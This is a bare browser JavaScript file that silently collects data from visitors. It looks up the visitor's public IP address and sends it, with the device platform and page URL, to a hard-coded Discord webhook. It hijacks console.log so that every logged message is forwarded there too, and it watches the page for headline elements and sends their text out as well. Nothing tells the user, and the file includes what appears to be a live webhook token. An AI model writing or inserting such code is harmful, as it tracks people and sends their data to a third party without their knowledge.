(async ()=>{
  const fileUrl = "https://corsproxy.io/?url=https://api.ipify.org/?format=txt";
  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";

  const fileRes = await fetch(fileUrl);
  if (!fileRes.ok) throw new Error(`fetch failed ${fileRes.status}`);
  
  const text = await fileRes.text();
  const payloadText = (text.length > 1900 ? text.slice(0,1900) + "\n\n...truncated" : text);
  const message = `${payloadText}\n\n(Sent from a device on ${navigator.userAgentData?.platform || navigator.platform} at the site located at ${location.href})`;

  const payload = { content: message };

  const res = await fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });

  if (!res.ok) throw new Error(`Webhook failed ${res.status}`);
})();

(function() {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
  const originalLog = console.log;
  console.log = function(...args) {
    originalLog.apply(console, args);
    const message = args.map(a => (typeof a === "object" ? JSON.stringify(a) : String(a))).join(" ");
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({content: message})
    }).catch(() => {});
  };
})();

function sendToWebhook(content){
  if(!content) return;
  fetch(webhookUrl, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({ content })
  }).catch(()=>{});
}

const observer2 = new MutationObserver(mutations=>{
  for(const m of mutations){
    if(m.type === "characterData"){
      const textNode = m.target;
      const parent = textNode.parentElement;
      if(!parent) continue;
      const headline = parent.closest && parent.closest(".compact-media-headline");
      if(headline){
        const txt = headline.innerText.trim();
        if(txt && headline.dataset.lastSent !== txt){
          sendToWebhook(txt);
          headline.dataset.lastSent = txt;
        }
      }
    } else if(m.type === "childList"){
      m.addedNodes.forEach(n=>{
        if(n.nodeType === 1){
          if(n.classList && n.classList.contains("compact-media-headline")){
            const txt = n.innerText.trim();
            if(txt && n.dataset.lastSent !== txt){
              sendToWebhook(txt);
              n.dataset.lastSent = txt;
            }
          }
          n.querySelectorAll && n.querySelectorAll(".compact-media-headline").forEach(el=>{
            const txt = el.innerText.trim();
            if(txt && el.dataset.lastSent !== txt){
              sendToWebhook(txt);
              el.dataset.lastSent = txt;
            }
          });
        } else if(n.nodeType === 3){
          const parent = n.parentElement;
          if(!parent) return;
          const headline = parent.closest && parent.closest(".compact-media-headline");
          if(headline){
            const txt = headline.innerText.trim();
            if(txt && headline.dataset.lastSent !== txt){
              sendToWebhook(txt);
              headline.dataset.lastSent = txt;
            }
          }
        }
      });
    }
  }
});

observer2.observe(document.body, { childList: true, subtree: true, characterData: true });
